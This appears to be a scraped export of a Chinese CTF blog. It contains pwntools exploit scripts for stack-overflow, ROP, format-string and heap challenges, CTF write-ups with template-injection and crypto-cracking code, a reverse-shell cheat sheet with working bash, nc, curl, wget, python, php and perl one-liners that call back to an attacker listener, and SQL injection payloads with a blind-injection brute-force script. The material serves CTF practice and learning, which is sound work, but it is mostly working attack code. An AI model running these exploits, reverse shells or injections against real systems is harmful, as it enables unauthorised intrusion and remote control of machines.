elf.plt[\"system\"]bin_sh = next(elf.search(b\"/bin/sh\"))payload = b'A'*0x70 + p32(system_plt) + b'BBBB' + p32(bin_sh)io.sendline(payload)io.interactive() ret2libc2栈溢出 无/bin/sh字符串，但bss段可写 第一种 123456789101112from pwn import *io = process(\"./ret2libc2\")elf = ELF(\"./ret2libc2\")system_plt = elf.plt[\"system\"]gets_plt = elf.plt[\"gets\"]bss = 0x804a080payload = b'A'*0x70 + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)io.sendline(payload)io.sendline(b\"/bin/sh\\x00\")io.interactive() 第二种 12345678910111213from pwn import *io = process(\"./ret2libc2\")elf = ELF(\"./ret2libc2\")system_plt = elf.plt[\"system\"]gets_plt = elf.plt[\"gets\"]bss = 0x804a080pop_ebx_ret = 0x804843dpayload = b'A'*0x70 + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)io.sendline(payload)io.sendline(b\"/bin/bash\\x00\")io.interactive() retlibc3栈变量的结构 栈的结构 泄露libc 应该是libc不同导致打不通 12345678910111213141516from pwn import *io = process(\"./ret2libc3\")elf = ELF(\"./ret2libc3\")libc = ELF(\"libc-2.23.so\")put = elf.got[\"puts\"]puts = libc.symbols[\"puts\"]system = libc.symbols[\"system\"]io.sendlineafter(b\" :\",str(put))io.recvuntil(b\" : \")libcbase = int(io.recvuntil(b\"\\n\",drop = True),16) - putspayload = flat( cyclic(60), libcbase + system , 0xdeadbeef ,next(elf.search(b\"sh\\x00\")))io.sendlineafter(b\" :\",payload)io.interactive() pwn2_x64栈图 pwn3 通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露 无sh （1）符号有无sh （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh 12345678910111213141516171819202122232425from pwn import *io = process(\"./level3\")libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")elf = ELF(\"./level3\")vulfun_addr = 0x0804844B write_plt = elf.symbols[\"write\"]write_got = elf.got[\"write\"]payload1 = cyclic(0x88+4) + p32(write_plt) + p32(vulfun_addr) + p32(1) + p32(write_got) + p32(4)io.recvuntil(b\"Input:\\n\")io.sendline(payload1)write_addr = u32(io.recv(4)) #Specify four byteslibc_base = write_addr - libc.symbols[\"write\"]system_addr = libc.symbols[\"system\"] + libc_basesh_addr = libc_base + next(libc.search(b\"/bin/sh\"))#libc_write=libc.symbols['write']#libc_system=libc.symbols['system']#libc_sh=next(libc.search(b'/bin/sh'))#system_addr=write_addr-libc_write+libc_system #sh_addr=write_addr-libc_write+libc_shpayload2 = cyclic(0x88+4) + p32(system_addr) + b'A'*4 + p32(sh_addr)io.sendline(payload2)io.interactive() pwn3_x64两次ROP 1234567891011121314151617181920212223from pwn import * #context.log_level=\"debug\" elf=ELF(\"level3_x64\") write_plt=elf.symbols[\"write\"] write_got=elf.got[\"write\"] vul_addr=elf.symbols['vulnerable_function']p = process(\"./level3_x64\")#p=remote(\"47.116.107.8\",9883) p.recvuntil(b\"Input:\\n\") pop_rdi_addr=0x00000000004006b3 #0x00000000004006b3 : pop rdi ; retpop_rsi_r15_addr=0x00000000004006b1 #0x00000000004006b1 : pop rsi ; pop r15 ; retpayload1 = cyclic(0x80+8) + p64(pop_rdi_addr) + p64(1) + p64(pop_rsi_r15_addr) + p64(write_got) + p64('deadbeef') + p64(write_plt) + p64(vul_addr) p.sendline(payload1) t=p.recv(8)write_addr=u64(t[0:8]) libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") offset=write_addr-libc.symbols[\"write\"] sys_addr=offset+libc.symbols[\"system\"] bin_addr=offset+next(libc.search(b\"/bin/sh\"))payload2 = cyclic(0x80+8) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)p.sendline(payload2) p.interactive() 格式化字符串fmtstr1还是比较简单的 思路：将x的地址放到栈上，对应的获取栈上的地址相对于printf的第几个参数 12345678from pwn import * conn=process('./fmtstr1')e=ELF('./fmtstr1')x_addr=0x0804A02C payload=p32(x_addr) + b\"%11$n\"conn.sendline(payload)conn.interactive() fmstr2这题很奇怪 X64 感觉是爆破出来的 1%9$s fmstr_uafRWX打开，说明应该是返回shellcode 也就是栈上写shellcode 此外，还需要利用堆进行UAF 进行shellcode的调用 同时还有fmstr泄露main’rbp的位置 123456789101112131415161718192021222324252627from pwn import *p=process(\"./echo2\")elf=ELF(\"./echo2\")p.recvuntil(\"hey, what's your name? : \")shellcode=b\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"p.sendline(shellcode)p.recvuntil(b\"&gt; \")p.sendline(b\"2\")payload=b\"%10$p\"+b\"A\"*3p.sendline(payload)p.recvuntil(b\"0x\")shellcode_addr=int(p.recvuntil(b'AAA',drop=True),16)-0x20p.recvuntil(b\"&gt; \")p.sendline(b\"4\")p.recvuntil(b\"to exit? (y/n)\")p.sendline(b\"n\")p.recvuntil(b\"&gt; \")p.sendline(b\"3\")p.recvuntil(b\"hello \\n\")p.sendline(b\"A\"*24+p64(shellcode_addr))p.interactive() 堆heap1 首先需要搞两个chunk(8byte)，free后，这样，我们fastbin中就会有两个8byte的chunk 之后我们在分配1个chunk，由于fastbin的缘故 我们就会把ptr[1]中的chunk直接拿过来 并且我们可以控制content size为8 我们也就把ptr[0]中的chunk拿了过来 从而达到了UAF 12345(*ptr[v1])(ptr[v1]);int self_puts(int a1)&#123; return puts(*(a1 + 4));&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import * p = remote(\"chall.pwnable.tw\",10102)#p=process(\"./hacknote\")elf = ELF(\"./hacknote\")libc = ELF(\"./libc_32.so.6\")read_got = elf.got[\"read\"]pfputs = 0x804862b def add_note(size,index): p.recvuntil(b\"choice :\") p.sendline(b\"1\") p.recvuntil(b\"size :\") p.sendline(size) p.recvuntil(b\"Content :\") p.sendline(index) def delete_note(index): p.recvuntil(b\"choice :\") p.sendline(b\"2\") p.recvuntil(b\"Index :\") p.sendline(index) def print_note(index): p.recvuntil(b\"choice :\") p.sendline(b\"3\") p.recvuntil(b\"Index :\") p.sendline(index)#p.interactive()add_note(b\"16\",b\"aaaaa\")add_note(b\"16\",b\"aaaaa\")delete_note(b'0')delete_note(b'1')add_note(b'8',p32(pfputs)+p32(read_got))print_note(b'0')pfread = u32(p.recv()[0:4])pfsys = pfread - 0xd41c0 + 0x3a940#p.interactive()delete_note(b'2')#p.interactive()#p.recv()#p.interactive()add_note(b'8',p32(pfsys)+b\"||sh\")print_note(b'0')p.interactive() ​","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"CUMT2020华为杯","slug":"CUMT2020华为杯","date":"2020-10-24T09:53:38.000Z","updated":"2020-11-20T14:18:17.449Z","comments":true,"path":"2020/10/24/CUMT2020华为杯/","link":"","permalink":"https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/","excerpt":"","text":"CUMT华为杯web狗活成了各方向签到手… webbabyflask模板注入 1&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125; dogef12摇奖得flag rehello_world异或 1234567891011121314d=[]b = \"is_easy_right?\"a = ['2A', '26', '12', '31', '1A', '7', '11', '3A', '2D', '0F', '0E','1A', '41', '4B', '36', '43', '31', '0', '3E', '16', '17', '35','1D', '10', '38', '11', '44', '4A', '1B', '2C', '2B', '17','50','3', '4']for x in a: c = '' z = x c += '0x' c +=z d.append(c)d = 0for i in range(0,35): c = int(a[i],16) m = i%14 print(chr(ord((b[m]))^c),end='') non_name四元一次方程 12345678b = [12, 32, 34, 12, 53, 1, 2, 4, 6, 8, 34, 45, 56, 32, 85, 43]c = ['a','b','c','d']for i in range(0,4): sum1 = 0 for j in range(0,4): print(\"%s*%s\"%(b[i*4+j],c[j]),end='+') print('\\n')#116 103 102 114 cryptoClassical维吉尼亚密码，上网down脚本，猜密钥，跑出来 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cipher = \"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn.\"# coding: utf-8def encrypt(message, key): cipher = '' j = 0 for i in range(len(message)): if key[j % len(key)].islower(): offset = ord(key[j % len(key)]) - ord('a') else: if key[j % len(key)].isupper(): offset = ord(key[j % len(key)]) - ord('A') else: offset = ord(key[j % len(key)]) - 48 j += 1 if message[i].isalpha(): if message[i].islower(): cipher += chr((ord(message[i]) - ord('a') + offset) % 26 + ord('a')) else: cipher += chr((ord(message[i]) - ord('A') + offset) % 26 + ord('A')) else: cipher += message[i] j -= 1 return cipherdef decrypt(cipher, key): explain = '' j = 0 for i in range(len(cipher)): if key[j % len(key)].islower(): offset = ord(key[j % len(key)]) - ord('a') else: if key[j % len(key)].isupper(): offset = ord(key[j % len(key)]) - ord('A') else: offset = ord(key[j % len(key)]) - 48 j += 1 if cipher[i].isalpha(): if cipher[i].islower(): explain += chr((ord(cipher[i]) - ord('a') - offset) % 26 + ord('a')) else: explain += chr((ord(cipher[i]) - ord('A') - offset) % 26 + ord('A')) else: explain += cipher[i] j -= 1 return explainprint(decrypt(cipher,'Lethelastctf'))CUMTCTF&#123;EnjoyTheVigenereCipher&#125; ezRSA大数e 可以判断是wiener attack 上网直接down脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&#39;&#39;&#39;Created on Dec 14, 2011@author: pablocelayes&#39;&#39;&#39;import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratordef hack_RSA(e,n): &#39;&#39;&#39; Finds d knowing (e,n) applying the Wiener continued fraction attack &#39;&#39;&#39; frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n) convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0: phi &#x3D; (e*d-1)&#x2F;&#x2F;k s &#x3D; n - phi + 1 # check if the equation x^2 - s*x + n &#x3D; 0 # has integer roots discr &#x3D; s*s - 4*n if(discr&gt;&#x3D;0): t &#x3D; Arithmetic.is_perfect_square(discr) if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0: print(&quot;Hacked!&quot;) return d# TEST functionsdef test_hack_RSA(): print(&quot;Testing Wiener Attack&quot;) times &#x3D; 5 while(times&gt;0): e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024) print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;) print(&quot;d &#x3D; &quot;, d) hacked_d &#x3D; hack_RSA(e, n) if d &#x3D;&#x3D; hacked_d: print(&quot;Hack WORKED!&quot;) else: print(&quot;Hack FAILED&quot;) print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d) print(&quot;-------------------------&quot;) times -&#x3D; 1 if __name__ &#x3D;&#x3D; &quot;__main__&quot;: n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151 #test_is_perfect_square() d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895 m &#x3D; pow(c,d,n) def num2str(num): tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;) if(len(tmp))%2 &#x3D;&#x3D;0: return tmp.decode(&quot;hex&quot;) else: return (&quot;0&quot;+tmp).decode(&quot;hex&quot;) print(num2str(m)) #print(&quot;-------------------------&quot;) #print(hack_RSA(e,n))CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125; miscSign In转base64在转brainfk 1CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125; 出个流量分析吧http流base64解码 1flag&#123;WirRSharK_S0_E45y&#125; 出个LSB吧LSB隐写 red green blue 0 0 0 保存得二维码 扫得flag 1cumtctf&#123;1sb_i4_s0_Ea4y&#125; 出个伪web吧查看最新修改文件的时间 可以看到pass中有明显字符串cumt 然后拿flag包裹就行 出个文档吧隐藏文字 内存取证12python vol.py -f memory.img imageinfopython vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag 可以看到有flag.png，输出一下 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900 可以看到一个图片扫一下 1jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D; 解不出来 查看系统窗口列表，看有没有和flag有关的程序 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag 可以看到有一个程序dump一下 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992 用foremost分离一下 可以看到有图片 有key值和vi 然后就是AES加密 12345key:Th1s_1s_K3y00000vi:1234567890123456base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125; 出个压缩包吧010打开之后发现有secret.png没有伪加密，很明显子块被修改 7a改成74 分离出secret.png 发现是一张图片，但有两帧 脱到steg里面可以看到两个残缺的二维码 补全，就可以看到flag 1flag&#123;yanji4n_bu_we1shi&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"反弹shell总结","slug":"反弹shell总结","date":"2020-10-03T05:45:01.000Z","updated":"2020-11-20T14:19:35.452Z","comments":true,"path":"2020/10/03/反弹shell总结/","link":"","permalink":"https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/","excerpt":"","text":"前言最近遇到反弹shell，总结一下反弹shell，用来做笔记 反弹shell反向Shell指Shell回弹或者叫反射，就是说受害者kali把自己的Shell挂载（或者叫attach更合适）到某个端口上，以此暴露到攻击者win可以连接的位置，攻击者win通过连接该端口最终拿到shell。 以下实验都为 kali为被攻击者来模仿服务器 win为攻击者 kali（服务端）：192.168.202.129 win（客户端）：169.254.158.23 bash反弹shell1bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1 bash产生了一个交互环境让本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 实验首先在win上监听8080端口 1nc -nvlp 8080 -n: 不反向解析dns，即不通过ip解析域名 no dns -v: 详细信息输出 verbose -l: 监听 listen -p: 指定端口 port 然后再kali上运行 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1 之后反弹成功 解释具体各参数的意义 linux文件描述符 1230 - stdin 代表标准输入,使用&lt;或&lt;&lt;1 - stdout 代表标准输出,使用&gt;或&gt;&gt;2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt; >&amp; 1234567891011当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符&gt;&amp;和&gt;的区别root@kali:/var/www/html# ls //查看无1.phpflag.php index.phproot@kali:/var/www/html# cat 1.php 2&gt;1 //将错误内容输入到1文件中root@kali:/var/www/html# cat 1cat: 1.php: 没有那个文件或目录root@kali:/var/www/html# cat 1.php 2&gt;&amp;1 //将错误内容按标准输出出来cat: 1.php: 没有那个文件或目录 bash -i 产生一个bash环境 /dev/tcp/ip/port： /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出。 0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了 nc一句话反弹1nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash -e: 指定nc连接成功后执行的程序 无-e的情况下可以执行 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f; 实验1首先在win（客户端）上监听7777端口 1nc -nvlp 7777 然后在kali（服务端）上一句话反弹 1nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash 反弹成功 实验2win上监听端口 1nc -nvlp 7777 kali上执行 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f; 反弹成功 curl反弹前提要利用bash一句话的情况下使用curl反弹shell kali上index文件上含有bash一句话，就可以反弹shell。 实验kali（服务端）上检查是否有bash一句话 123curl 192.168.202.129bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1 在win（客户端）上监听端口 1nc -nvlp 7777 利用服务端curl反弹 1curl 192.168.202.129|bash 反弹成功 wget反弹其实是利用wget和php脚本一块执行达到反弹 实验首先在win（应该在任何一台服务器上也行）上有shell.txt，写入以下php内容 1234&lt;?php$sock=fsockopen(\"localhost\",12345);//localhost为自己的ipexec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 先在win（客户端）上监听 1nc -nvlp 7777 在kali（服务端）上利用wget下载shell.txt，然后执行php 1wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php 反弹成功 python反弹利用curl 但这次用的是py脚本 123456789#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"169.254.158.23\",7777)) #更改localhost为自己的ip,端口任意os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"]) 当然也可以直接执行 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"169.254.158.23\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 效果是一样的 实验1首先在kali（服务端）上写下py脚本 123456789#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"169.254.158.23\",7777)) #更改localhost为自己的ip,端口任意os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"]) win（客户端）监听 1nc -nvlp 7777 kali（服务端）curl 1curl 192.168.202.129/shell.py|python 反弹成功 实验2在win（客户端）监听端口 1nc -nvlp 7777 在kali（服务端）输入 1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39; 反弹成功 php反弹和python一样利用curl php脚本如下，和上面的shell.txt一样的 1234&lt;?php$sock=fsockopen(\"169.254.158.23\",7777);//localhost为自己的ip，端口任意exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 也可以执行 1php -r '$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 实验1首先在kali（服务端）写下php脚本，存为shell.txt 1234&lt;?php$sock=fsockopen(\"169.254.158.23\",7777);//localhost为自己的ip，端口任意exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 在win（客户端）监听端口 1nc -nvlp 7777 kali（服务端）curl反弹 1curl 192.168.202.129/shell.txt|php 反弹成功 实验2win上监听端口 1nc -nvlp 7777 kali上执行 1php -r '$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 反弹成功 perl反弹和上面几个反弹一样 这里只做一下演示 1perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;; 实验在win上监听端口 在kali上执行 1perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;; 反弹成功 总结以上都是最基本的反弹shell 其实反弹shell还是很灵活的，具体什么样的场景下怎么用还需要自己判断","categories":[{"name":"笔记","slug":"笔记","permalink":"https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"总结","slug":"总结","permalink":"https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"BUU刷题(Web)","slug":"BUU刷题","date":"2020-09-27T15:15:28.000Z","updated":"2020-11-20T14:18:05.259Z","comments":true,"path":"2020/09/27/BUU刷题/","link":"","permalink":"https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/","excerpt":"","text":"BUU(Web)前言其实自己会做完题写一些wp，但奈何自己三天摸鱼两天休息，所以上传上来监督自己学习 顺便分一下类 SQL注入[强网杯 2019]随便注（堆叠注入） 堆叠注入： 分号（；）来表示一条sql语句的结束。结束一个sql语句再继续构造下一条语句，可以一起执行。堆叠注入可以执行的是任意的语句。 先来了解一下堆叠注入 1231&#39; #1&#39; order by 2#1&#39; union select 1,2# 可以看到过滤了大多数语句，但我们还有show，alert，rename，desc等 通过看表可以看见两个表 11&#39;;desc words;# words表 11&#39;;desc &#96;1919810931114514&#96;;# &#x2F;&#x2F;在mysql中数字型需要&#96;&#96; 此时，我们就找见了flag，但问题是怎么拿出flag呢？ 下面操作是骚姿势： 主要思想是利用回显位置来倒退获取flag，回显肯定是id到words表里面找数据，然后回显，那么我们在查询语句不变的前提下，将flag回显出来？ 把words表改名，把数字表改为words； 往新words表里面插入一个id参数，这样回显就可以找到id，从而显示出flag 1select id,data from words where id&#x3D;&#39;id&#39;; 所以flag还得改成data 最终payload 11&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 复习一下mysql操作 123456#表重命名rename table o_name to n_name;#新增字段alert table table_name add column_name [type];#修改字段名alert table table_name change o_name n_name [type]; [SUCTF 2019]EasySQL（堆叠注入）过滤了很多东西，但依然可以堆叠注入 找到Flag表 之后就不会做了… 12select 1;set sql_mode&#x3D;pipes_as_concat;select 1||flag from Flag; 补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，也和字符串的拼接函数Concat相类似 原本||是or的意思，这里拼接之后： [极客大挑战 2019]EasySQL直接万能密码登录 1admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23 [极客大挑战 2019]LoveSQL简单的sql注入 直接union注入 1231&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)# [极客大挑战 2019]BabySQL（过滤关键字）双写绕过 查关键字可以先select语句观察哪些被过滤了。 其中关键字有select，union，or（包括information,password），from，where， 12345671&#39; ununionion selselectect 1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #&#x2F;&#x2F;b4bsql,geekuser1&#39; ununionion selselectect 1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #&#x2F;&#x2F;id username password&#x2F;&#x2F;id username password1&#39; ununionion selselectect 1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125; [CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）简单测试了一下 发现空格被过滤了，union、and、or也被过滤了，并且发现列有两列，报错只出bool，于是就想到是不是盲注，但首要问题是怎么绕过空格 以下有几种绕空格的办法 /**/ （） %0a `` tab 这里我们用（）来绕过，接下来就是写脚本 1234567891011121314import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"flag = ''for i in range(0,50): for j in dic: payload = \"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)\".format(i,j) data = &#123;\"id\": payload,&#125; r = requests.post(url=url,data=data) if \"Hello\" in r.text: print(payload) flag += j break print(flag) 12拿到flagflag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125; 但我自己写的脚本很诡异，无法检测到-，只能通过payload倒推 所以又换了一个写了一下,用ascii字符来判断 1234567891011121314import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"flag = ''for i in range(1,50): for j in range(32,128): payload = \"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)\".format(i,j); data = &#123;\"id\": payload,&#125; r = requests.post(url=url,data=data) if \"Hello\" in r.text: print(payload) flag += str(chr(j)) break print(flag) 刚写脚本，对其中原理还不是很熟悉，希望后续能深入学习py 代码审计[极客大挑战 2019]Havefun直接看源码 拿flag 